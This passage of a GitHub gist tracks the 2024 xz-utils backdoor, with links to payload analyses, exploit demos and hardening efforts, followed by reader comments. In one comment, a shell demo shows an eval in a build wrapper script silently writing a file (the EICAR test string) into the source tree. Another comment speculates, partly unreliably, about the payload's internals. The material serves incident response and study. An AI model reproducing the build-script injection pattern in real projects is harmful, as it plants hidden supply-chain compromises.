  + *Hans Jansen* later went on to ask Debian to update xz-utils in <https://bugs.debian.org/1067708>, but this is quite a common thing for eager users to do, so it's not necessarily nefarious.

## People

We do not want to speculate on the people behind this project in this
document. This is not a productive use of our time, and law
enforcement will be able to handle identifying those responsible. They
are likely patching their systems too.

xz-utils had two maintainers:

* Lasse Collin (*Larhzu*) who has maintained xz since the beginning
  (~2009), and before that, `lzma-utils`.
* Jia Tan (*JiaT75*) who started contributing to xz in the last 2-2.5
  years and gained commit access, and then release manager rights,
  about 1.5 years ago. He was removed on 2024-03-31 as Lasse begins
  his long work ahead.

Lasse regularly has internet breaks and was on one of these
as this all kicked off. He has posted an update
at <https://tukaani.org/xz-backdoor/> and is working with the community.

Please be patient with him as he gets up to speed and takes time
to analyse the situation carefully.

## Misc notes

* [Please **do not** use `ldd` on untrusted binaries](https://jmmv.dev/2023/07/ldd-untrusted-binaries.html)
  + [[PATCH] ldd: Do not recommend binutils as the safer option](https://lore.kernel.org/linux-man/20231016061923.105814-1-siddhesh%40gotplt.org/t/#u)
* [Internet Archive has a collection of the release tarballs](https://web.archive.org/web/%2A/https%3A//github.com/tukaani-project/xz/releases/download/%2A)
* I've also created a git repo for my own convenience at <https://github.com/thesamesam/xz-archive>.
* Lasse Collin's in-progress [review notes](https://tukaani.org/xz-backdoor/review.html) as he audits xz.git

## Analysis of the payload

This is the part which is very much in flux. It's early days yet.

These two especially do a great job of analysing the initial/bash stages:

* [xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?lang=en&id=782) by @gynvael
* [The xz attack shell script](https://research.swtch.com/xz-script) by Russ Cox

Other great resources:

* [Filippo Valsorda's bluesky thread](https://bsky.app/profile/did%3Aplc%3Ax2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b)
* [XZ Backdoor Analysis (WIP)](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504) by @smx-smx
  + [XZ backdoor reverse engineering - git repo](https://github.com/smx-smx/xzre)
* [xz backdoor documentation wiki](https://github.com/Midar/xz-backdoor-documentation/wiki) by @Midar et. al
* [modify\_ssh\_rsa\_pubkey.py](https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4) - script to trigger more parts of the payload in a compromised `sshd` by @keeganryan
* [xz-malware](https://github.com/karcherm/xz-malware) by @karcherm
* [xz-backdoor](https://github.com/hamarituc/xz-backdoor) by @hamarituc
* [xzbot: notes, honeypot, and exploit demo](https://github.com/amlweems/xzbot) by @amlweems. This contains binary patching for the key!
* [XZ Backdoor Extract](https://github.com/0xlane/xz-cve-2024-3094) by @0xlane
* <https://github.com/blasty/JiaTansSSHAgent>
* [XZ backdoor story – Initial analysis](https://securelist.com/xz-backdoor-story-part-1/112354) (part 1) by Kaspersky
  + [Assessing the Y, and How, of the XZ Utils incident](https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/) (part 2) by Kaspersky
* [liblzma.so infection](https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor) by binarly.io
* [Minimal setup to trigger the xz backdoor](https://github.com/felipec/xz-min) by @felipec

## Other projects

There are concerns some other projects are affected (either by themselves or changes to other projects were made to facilitate the xz backdoor). I want to avoid a witch-hunt but listing some examples here which are already been linked widely to give some commentary.

* libarchive is being checked out:

  + [libarchive/libarchive#2103](https://github.com/libarchive/libarchive/issues/2103) coordinates the review effort
  + [libarchive/libarchive#1609](https://github.com/libarchive/libarchive/pull/1609) was made by Jia Tan
    - [Solar Designer's take](https://openwall.com/lists/oss-security/2024/03/31/11) - with an interesting discussion about how terminal applications should act here
    - The initial fix post-review for this was [libarchive/libarchive#2101](https://github.com/libarchive/libarchive/pull/2101) (<https://github.com/libarchive/libarchive/commit/6110e9c82d8ba830c3440f36b990483ceaaea52c>).
    - After review, [libarchive/libarchive#2101](https://github.com/libarchive/libarchive/pull/2101) was made by libarchive maintainers.
    - It doesn't appear exploitable but the change in [libarchive/libarchive#2101](https://github.com/libarchive/libarchive/pull/2101) was made out of caution.
    - One of the libarchive maintainers has filed [libarchive/libarchive#2107](https://github.com/libarchive/libarchive/issues/2107) to discuss a better fix as well.
* [google/oss-fuzz#10667](https://github.com/google/oss-fuzz/pull/10667) was made by Jia Tan to disable IFUNC in oss-fuzz when testing xz-utils

  + It is unclear if this was safe or not. Obviously, it doesn't look great, but see below.
  + Note that IFUNC *is* a brittle mechanism and it is known to be sensitive to e.g. ASAN, which is why the change didn't raise alarm bells. i.e. It is possible that such a change was genuinely made in good faith, although it's of course suspicious in hindsight. But I wouldn't say the oss-fuzz maintainers should have rejected it, either.
    - gcc [PR70082](https://gcc.gnu.org/PR70082)
    - gcc [PR87482](https://gcc.gnu.org/PR87482)
    - gcc [PR110442](https://gcc.gnu.org/PR110442)
    - gcc [PR114115](https://gcc.gnu.org/PR114115) - a real bug which xz found(!)

## Tangential efforts as a result of this incident

This is for suggesting specific changes which are being considered as a result of this.

* CMake: [Consider hardening check\_c\_source\_compiles](https://gitlab.kitware.com/cmake/cmake/-/issues/25846) - [MR](https://gitlab.kitware.com/cmake/cmake/-/merge_requests/9391)
* bug-autoconf: [Add a syntax check to code snippets](https://savannah.gnu.org/support/?111048)
* bug-autoconf: [autoreconf --force seemingly does not forcibly update everything](https://lists.gnu.org/archive/html/bug-autoconf/2024-03/msg00000.html)
* systemd: [Reduce dependencies of libsystemd](https://github.com/systemd/systemd/issues/32028)
  + *Note*: There was prior work already on this in e.g. [systemd/systemd#31550](https://github.com/systemd/systemd/pull/31550). While it was initially thought that this [may have](https://openwall.com/lists/oss-security/2024/03/31/9) have caused acceleration of plans to backdoor xz, as the systemd changes had not yet landed in a release, the timing doesn't seem to work out..
    - *xz-5.6.0*, the first known-backdoored version, was released on 2024-02-26.
    - Per Debian's [package tracker](https://tracker.debian.org/pkg/xz-utils), *xz-5.6.0* was first added on that same day. This predates the systemd PR which was opened on 2024-02-29.
    - That said, the [original PR](https://github.com/systemd/systemd/pull/31131) to move systemd towards more `dlopen()` for e.g. `kmod` was opened on 2024-01-30.
    - On the same day, a systemd developer [suggested](https://github.com/systemd/systemd/pull/31131#issuecomment-1917954597) extending the approach to compression libraries.
* systemd: [RFC: expose dlopen() dependencies in an ELF section](https://github.com/systemd/systemd/pull/32234)
  + [LWN](https://lwn.net/Articles/969908/)
* groff: [[PATCH] Distribute bootstrap and bootstrap.conf](https://lists.gnu.org/archive/html/groff/2024-03/msg00211.html)
* GNU binutils: [Remove dependency on libjansson](https://inbox.sourceware.org/binutils/CACKH%2B%2BZCwhA9n9GfsWPmBQgsSrvfeOpLha0%3DUCpHzPDD8vQpNQ%40mail.gmail.com/T/#u)
  + This is being proposed by @rui314, the maintainer of mold. Rui also wrote about the risks to linkers in <https://x.com/rui314/status/1774286434335338965>.
* openssh
  + Note that as covered above, OpenSSH are looking at removing the need for downstreams to patch in libsystemd by implementing a library-less version of the same functionality.
  + Andres Freund noticed an interesting [tangential bug/area for improvement](https://bugzilla.mindrot.org/show_bug.cgi?id=3675) when analysing the exploit, which would avoid checking against algorithms disabled by configuration. (This is not a vulnerability in OpenSSH and it wouldn't have prevented any of this, but it's come out of this whole thing nonetheless).
* Auditing Linux distribution packages with [distro-backdoor-scanner](https://github.com/hlein/distro-backdoor-scanner)
* esr's [autodafe](https://gitlab.com/esr/autodafe/) to aid conversion from autotools -> Makefiles
* backseat-signed: [New supply-chain security tool: backseat-signed](https://lists.debian.org/debian-devel/2024/04/msg00088.html)
  + github: <https://github.com/kpcyrd/backseat-signed>

## Discussions in the wake of this

This is for linking to interesting general discussions, rather than specific changes being suggested (see above).

* automake: [GNU Coding Standards, automake, and the recent xz-utils backdoor](https://lists.gnu.org/archive/html/automake/2024-03/msg00007.html)
* bug-gnulib: [git repositories vs. tarballs](https://lists.gnu.org/archive/html/bug-gnulib/2024-04/msg00239.html)
* fedora-devel: [Three steps we could take to make supply chain attacks a bit harder](https://lists.fedoraproject.org/archives/list/devel%40lists.fedoraproject.org/thread/YWMNOEJ34Q7QLBWQAB5TM6A2SVJFU4RV/)
* debian-devel: [Upstream dist tarball transparency (was Re: Validating tarballs against git repositories)](https://lists.debian.org/debian-devel/2024/04/msg00103.html)
* oss-security: [Make your own backdoor: CFLAGS code injection, Makefile injection, pkg-config](https://www.openwall.com/lists/oss-security/2024/04/17/3)

Non-mailing list proposals:

* Simon Josefsson's blog: [Towards reproducible minimal source code tarballs? On \*-src.tar.gz](https://blog.josefsson.org/2024/04/01/towards-reproducible-minimal-source-code-tarballs-please-welcome-src-tar-gz/)
* Simon Josefsson's blog: [Reproducible and minimal source-only tarballs](https://blog.josefsson.org/2024/04/13/reproducible-and-minimal-source-only-tarballs/)

## Acknowledgements

* Andres Freund who discovered the issue and reported it to *linux-distros* and then *oss-security*.
* All the hard-working security teams helping to coordinate a response and push out fixes.
* Xe Iaso who resummarized this page for readability.
* Everybody who has provided me tips privately, in #tukaani, or in comments on this gist.

## Meta

**Please try to keep comments on the gist constrained to editorial changes I need to make, new sources, etc.**

There are various places to theorise & such, please see e.g. <https://discord.gg/TPz7gBEE> (for both, reverse engineering and OSint). (I'm not associated with that Discord but the link is going around, so...)

### Response to questions

* A few people have asked why Jia Tan followed me (@thesamesam) on GitHub. #tukaani was a small community on IRC before this kicked off (~10 people, currently has ~350). I've been in #tukaani for a few years now. When the move from self-hosted infra to github was being planned and implemented, I was around and starred & followed the new Tukaani org pretty quickly.
* I'm referenced in one of the [commits](https://git.tukaani.org/?p=xz.git;a=commit;h=72d2933bfae514e0dbb123488e9f1eb7cf64175f) in the original oss-security post that works around noise from the IFUNC resolver. This was a legitimate issue which applies to IFUNC resolvers in general. The GCC bug it led to ([PR114115](https://gcc.gnu.org/PR114115)) has been fixed.

  + On reflection, there may have been a missed opportunity as maybe I should have looked into why I couldn't hit the reported Valgrind problems from Fedora on Gentoo, but this isn't the place for my own reflections nor is it IMO the time yet.

### TODO for this doc

* Add a table of releases + signer?
* Include the injection script after the macro
* Mention detection?
* Explain the bug-autoconf thing maybe wrt serial
* Explain dist tarballs, why we use them, what they do, link to autotools docs, etc
  + "Explaining the history of it would be very helpful I think. It also explains how a single person was able to insert code in an open source project that no one was able to peer review. It is pragmatically impossible, even if technically possible once you know the problem is there, to peer review a tarball prepared in this manner."

### TODO overall

Anyone can and should work on these. I'm just listing them so people have a rough idea of what's left.

* **Ensuring Lasse Collin and xz-utils is supported**, even long after the fervour is over
* Reverse engineering the payload (it's still fairly early days here on this)
  + Once finished, tell people whether:
    - the backdoor did anything else than waiting for connections for RCE, like:
      * call home (send found private keys, etc)
      * load/execute additional rogue code
      * did some other steps to infest the system (like adding users, authorized\_keys, etc.) or whether it can be certainly said, that it didn't do so
    - other attack vectors than via sshd were possible
    - whether people (who had the compromised versions) can feel fully safe
      *if* they either had sshd not running OR at least not publicly
      accessible (e.g. because it was behind a firewall, nat, iptables,
      etc.)
* Auditing all possibly-tainted xz-utils commits
* Investigate other paths for `sshd` to get `liblzma` in its process (not just via `libsystemd`, or at least not directly)
  + This is already partly done and it looks like none exist, but it would be nice to be sure.
* Checking other projects for similar injection mechanisms (e.g. similar build system lines)
  + See [distro-backdoor-scanner](https://github.com/hlein/distro-backdoor-scanner)
  + <https://codesearch.debian.net/> may be helpful
* Diff and review all "golden" upstream tarballs used by distros against the output of creating a tarball from the git tag for all packages.
* Check other projecs which (recently) introduced IFUNC, as suggested by *thegrugq*.
  + This isn't a bad idea even outside of potential backdoors, given how brittle IFUNC is.
* ???

## References and other reading material

* [LWN - A backdoor in xz](https://lwn.net/Articles/967180/)
* [oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4)
* [Evan Boehs - Everything I know about the XZ backdoor](https://boehs.org/node/everything-i-know-about-the-xz-backdoor)
* [Tukaani - XZ Utils backdoor](https://tukaani.org/xz-backdoor/)
* [Rob Mensching - A Microcosm of the interactions in Open Source projects](https://robmensching.com/blog/posts/2024/03/30/a-microcosm-of-the-interactions-in-open-source-projects/)
* [Russ Cox - Timeline of the xz open source attack](https://research.swtch.com/xz-timeline)
* [Rhea's Substack - XZ Backdoor: Times, damned times, and scams](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and)
* [LWN - Free software's not-so-eXZellent adventure](https://lwn.net/Articles/967866/)
* [LWN - How the XZ backdoor works](https://lwn.net/Articles/967192/)
* [LWN - Identifying dependencies used via dlopen()](https://lwn.net/Articles/969908/)
* [openSUSE - What we need to take away from the XZ Backdoor](https://news.opensuse.org/2024/04/12/learn-from-the-xz-backdoor/)
* [CISA - Lessons from XZ Utils: Achieving a More Sustainable Open Source Ecosystem](https://www.cisa.gov/news-events/news/lessons-xz-utils-achieving-more-sustainable-open-source-ecosystem)
* [OpenSSF - Open Source Security (OpenSSF) and OpenJS Foundations Issue Alert for Social Engineering Takeovers of Open Source Projects](https://openssf.org/blog/2024/04/15/open-source-security-openssf-and-openjs-foundations-issue-alert-for-social-engineering-takeovers-of-open-source-projects/)
* <https://github.com/przemoc/xz-backdoor-links>

Load earlier comments...

[![@flybyray](https://avatars.githubusercontent.com/u/804661?s=80&v=4)](/flybyray)

Copy link

### **[flybyray](/flybyray)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021136#gistcomment-5021136)

> And my dear Ray, there’s already a NON-MALICIOUS EXPLANATION as to why an sh is used: it turns on the bcj flags.

Better safe than sorry. Ask yourself what a NON-\*-EXPLANATION is worth. Especially an explanation which is at all wrong - shows just that supplier has no experience.

Sorry, something went wrong.

[![@Artoria2e5](https://avatars.githubusercontent.com/u/6459309?s=80&v=4)](/Artoria2e5)

Copy link

### **[Artoria2e5](/Artoria2e5)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021427#gistcomment-5021427) • edited Loading

> sh provides additional insight via environment variables for child processes.

It also does not, because the shell script in question does not export anything new to the environment. The shell only changes envp in three circumstances:

* when a new variable is explicitly added to envp via "export" or "declare -x"
* when a variable is explicitly de-exported, say by running declare +x
* when an already-exported variable, such as PATH, is changed or unset

Otherwise every variable change stays local to the shell process.

The only additional "insight" is just the well-documented BCJ and lzma alignment parameters.

Maybe a doubt that is "at all wrong" also shows the doubter has no experience?

Sorry, something went wrong.

[![@paulfloyd](https://avatars.githubusercontent.com/u/17177100?s=80&v=4)](/paulfloyd)

Copy link

### **[paulfloyd](/paulfloyd)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021431#gistcomment-5021431) • edited Loading

Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?

<https://bugzilla.redhat.com/show_bug.cgi?id=2267598>

I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer? (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.

Sorry, something went wrong.

[![@flybyray](https://avatars.githubusercontent.com/u/804661?s=80&v=4)](/flybyray)

Copy link

### **[flybyray](/flybyray)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021649#gistcomment-5021649) • edited Loading

> Maybe a doubt that is "at all wrong" also shows the doubter has no experience?

Polite as you are, you used " maybe". Politeness won't help you against a criminal hacker's ideas. The experiences of doubters are often worth more than those of so-called fact-checkers.

> because the shell script in question does not export anything new to the environment

if you waited patiently after reading carefully until you really understood what you had read, without ignoring the meaning of the words, you could avoid misinterpretations and make fewer inference errors.

I wrote "insight via environment variables for CHILD processes". How dare are you that you then talk about "does not export anything new to the environment"? I wish you would rather fantasize about the similarity between `eval` and `evil`.

have you really understood only some of the attack patterns that have already been discussed here? because of course the attackers in a build process don't care about changing the environment! just think about how many places environment variables could appear in logs and the hide-and-seek game would end immediately. I would recommend to you, that you inspect some public build servers and their artifacts and detailed outputs of builds.

**The trick is to leave artifacts in the right places as inconspicuously as possible during the build process.**

But I'm not giving up on you yet. Let's start by making the bold printed a little clearer.

The following should only use the fragments highlighted in the leading comment as a sample. I didn't develop xz, so I'm replacing it with sh. I can't use the --robot --version arguments, but they are almost irrelevant.

```
# this is only pretext normally provided by the task to build the kernel
TEMPDIR="$(mktemp -du)"
mkdir -p $TEMPDIR/Artoria2e5/mykernel/scripts
mkdir -p $TEMPDIR/Artoria2e5/mykernel/prereqs
srctree=$TEMPDIR/Artoria2e5/mykernel
pre_reqs="$TEMPDIR/Artoria2e5/mykernel/prereqs/a.txt"
XZ=sh
export XZ
echo please cleanup $TEMPDIR when you are done
cat >"$TEMPDIR/Artoria2e5/mykernel/prereqs/a.txt"<<'EOF'
lorem ipsum and some intersting pointers to CANCER
EOF
cat >"$TEMPDIR/Artoria2e5/mykernel/scripts/xz_wrap.sh"<<'EOF'
eval "$($XZ -c 'TARGET_DIR='$(dirname ${BASH_SOURCE[0]})/..';echo STEVE_S_LATE_REVENGE_FOR_LINUX="$(grep -Po '\''pointers to \K\S+'\'')";echo $'\''X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\''> ${TARGET_DIR}/blob.txt')" || exit
#this is just to make it easier to understand the above XZ command would be able to produce this too
echo a $STEVE_S_LATE_REVENGE_FOR_LINUX that attaches itself in an intellectual property sense to everything it touches
EOF

# now we are going to "build the kernel" - show casing just relevant maybe malicious part
# original 'cmd_xzkern = cat $(real-prereqs) | sh $(srctree)/scripts/xz_wrap.sh > $@'
cat ${pre_reqs} | sh ${srctree}/scripts/xz_wrap.sh > a_message_to_the_linux_people.txt
# finished nothing special to see

# verify that the build context was modified
cat a_message_to_the_linux_people.txt
find $TEMPDIR -type f -name blob.txt -exec cat {} \;

# cleanup
rm -rvf $TEMPDIR
```

unfortunately, based on your reading comprehension, i have to assume that you still won't understand. but maybe there are a few others who can help you further.

The verify step would show you

* 'cat a\_message\_to\_the\_linux\_people.txt'

```
a CANCER that attaches itself in an intellectual property sense to everything it touches
```

* 'find $TEMPDIR -type f -name blob.txt -exec cat {} ;' # a nice blob placed into `srctree`

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

i have done my duty and shown good will

Sorry, something went wrong.

[![@dnorthup-ums](https://avatars.githubusercontent.com/u/18331571?s=80&v=4)](/dnorthup-ums)

Copy link

### **[dnorthup-ums](/dnorthup-ums)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021652#gistcomment-5021652)

> Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?
>
> <https://bugzilla.redhat.com/show_bug.cgi?id=2267598>
>
> I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer? (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.

[@paulfloyd](https://github.com/paulfloyd) The `0x6` address is pretty easy, that's evidence of something being compiled with the `-fPIE` compile time flag set, something the build scripts of xz-utils *do not* do (including the compromised ones). As for the 64-bit `0x77...` or `0xDD2A....` addresses, it looks to me like something is trying to be clever and take advantage of the "hole" between typical user space and kernel space when injecting the payload via `ifunc`. I suspect if you look at one of the disassembly attempts of the exploit you'll get more insight into what is going on there and why those are important (as noted, I strongly suspect they are).

Sorry, something went wrong.

[![@AdrianBunk](https://avatars.githubusercontent.com/u/3358267?s=80&v=4)](/AdrianBunk)

Copy link

### **[AdrianBunk](/AdrianBunk)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021701#gistcomment-5021701)

> > Maybe a doubt that is "at all wrong" also shows the doubter has no experience?
>
> Polite as you are, you used " maybe". Politeness won't help you against a criminal hacker's ideas. The experiences of doubters are often worth more than those of so-called fact-checkers.

> if you waited patiently after reading carefully until you really understood what you had read, without ignoring the meaning of the words, you could avoid misinterpretations and make fewer inference errors.

[@flybyray](https://github.com/flybyray) Conspiracy theories and insults from people like you are not helpful.

A huge amount of people all over the world who are highly competent in this area have been working on dissecting this exploit for 2 weeks, anyone who claims to have found something new on the technical side here in this discussion only demonstrates being clueless.

Please stop it.

Sorry, something went wrong.

[![@AdrianBunk](https://avatars.githubusercontent.com/u/3358267?s=80&v=4)](/AdrianBunk)

Copy link

### **[AdrianBunk](/AdrianBunk)** commented [Apr 12, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021703#gistcomment-5021703) • edited Loading

> The `0x6` address is pretty easy, that's evidence of something being compiled with the `-fPIE` compile time flag set, something the build scripts of xz-utils *do not* do (including the compromised ones).

All major distributions (including Debian) changed their compiler to default to PIE several years ago for ASLR.

Sorry, something went wrong.

[![@christoofar](https://avatars.githubusercontent.com/u/5059144?s=80&v=4)](/christoofar)

Copy link

### **[christoofar](/christoofar)** commented [Apr 13, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022283#gistcomment-5022283) • edited Loading

> Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?
>
> <https://bugzilla.redhat.com/show_bug.cgi?id=2267598>
>
> I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer? (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.

When we talked it out, the function that was doing this nuke (`microlzma` is what Jia Tan wants to raise during init), did not supply a size when it entered the loop to start writing `0x00` into a stack area.

This function, `lzma_stream_header_encodb`, is not in the 5.6.1 `.o` release, it only appears in the 5.6.0; hence the theory that a mistake in the feature flags for the build did not completely strip out the setup for a debug/examine tool (which would have reported out the progress of the locator and possibly also brought in a more comprehensive debug/examine tool as an option). My guess is that it's not a mistake in the offsets calculations (there is a whole DASM library inside the malware), but a way to quickly patch the obfuscations in while still making sure that the hotloading core code stays functional.

Jan Tan needed someway to know that he landed on all the jump calls needed to patch `libcrypto`.

Further: The final `5.6.1` has an insert in the ELF table for a note area that is moving all the bytes down `0x26`, and throwing the asm dumps into diff shows a heavy amount of offset changes in `microlzma`, the gateway to the backdoor.

Sorry, something went wrong.

[![@christoofar](https://avatars.githubusercontent.com/u/5059144?s=80&v=4)](/christoofar)

Copy link

### **[christoofar](/christoofar)** commented [Apr 13, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022356#gistcomment-5022356) • edited Loading

I've been thinking a lot about this as a CGo/gccgo dev: "What can a HLL programmer do against the likes of Jia Tan? They're attacking from the foundation software."

I'm not settled on this one but wrapping calls to C libs in goroutines probably would raise the difficultly level, as the rapid context switches and unpredictability introduced on where the Go runtime will move the jump calls happens.

After 129,000 lines of asm, here is `printf("Hello World")` in Go down at the bottom:

[![image](https://private-user-images.githubusercontent.com/5059144/322214129-7c5547a9-800f-4f50-98e8-6e57377438e1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDEyOS03YzU1NDdhOS04MDBmLTRmNTAtOThlOC02ZTU3Mzc3NDM4ZTEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MDkzNWM4YjQyMzc2N2E3NWY1Njk3MmRhYWY3ODEwMGM2MDc4MjEwMzQyZGQ1OTdiOTMxNGU0OWVmYWZhNjVjOCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.wYtm4USCm4r7DNpxPMcGoQSB1Ogt55pZUliN6wvKYJk)](https://private-user-images.githubusercontent.com/5059144/322214129-7c5547a9-800f-4f50-98e8-6e57377438e1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDEyOS03YzU1NDdhOS04MDBmLTRmNTAtOThlOC02ZTU3Mzc3NDM4ZTEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MDkzNWM4YjQyMzc2N2E3NWY1Njk3MmRhYWY3ODEwMGM2MDc4MjEwMzQyZGQ1OTdiOTMxNGU0OWVmYWZhNjVjOCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.wYtm4USCm4r7DNpxPMcGoQSB1Ogt55pZUliN6wvKYJk)

Now, let's see what happens when we do this:

```
func main() {
	hello := "Hello world!"
	go func() {
		print(hello)
	}()
	time.Sleep(1*time.Second)
}

```

Now we're asking the Go runtime to activate concurrency and `main` itself gets split into two compact parts with an anonymous function that disappears into the goroutine ecosphere (to get this to fit I'm stripping symbols):

[![image](https://private-user-images.githubusercontent.com/5059144/322214734-2474085d-bff5-4ff7-94c5-d56c29c0d5d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDczNC0yNDc0MDg1ZC1iZmY1LTRmZjctOTRjNS1kNTZjMjljMGQ1ZDAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NmExZTQ4ODgxYWVlMGNjODQwNTYwNTk0ZmY2ZDg5NjQ1ZmY1OWVlODk4MzhkOWQ2ZDkyY2U3ZWY1YmM5NTBkMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9dA5mNX0pGxhVKcNA97fMuJ6U2-k3xJaZpe33agIvqI)](https://private-user-images.githubusercontent.com/5059144/322214734-2474085d-bff5-4ff7-94c5-d56c29c0d5d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDczNC0yNDc0MDg1ZC1iZmY1LTRmZjctOTRjNS1kNTZjMjljMGQ1ZDAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NmExZTQ4ODgxYWVlMGNjODQwNTYwNTk0ZmY2ZDg5NjQ1ZmY1OWVlODk4MzhkOWQ2ZDkyY2U3ZWY1YmM5NTBkMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9dA5mNX0pGxhVKcNA97fMuJ6U2-k3xJaZpe33agIvqI)

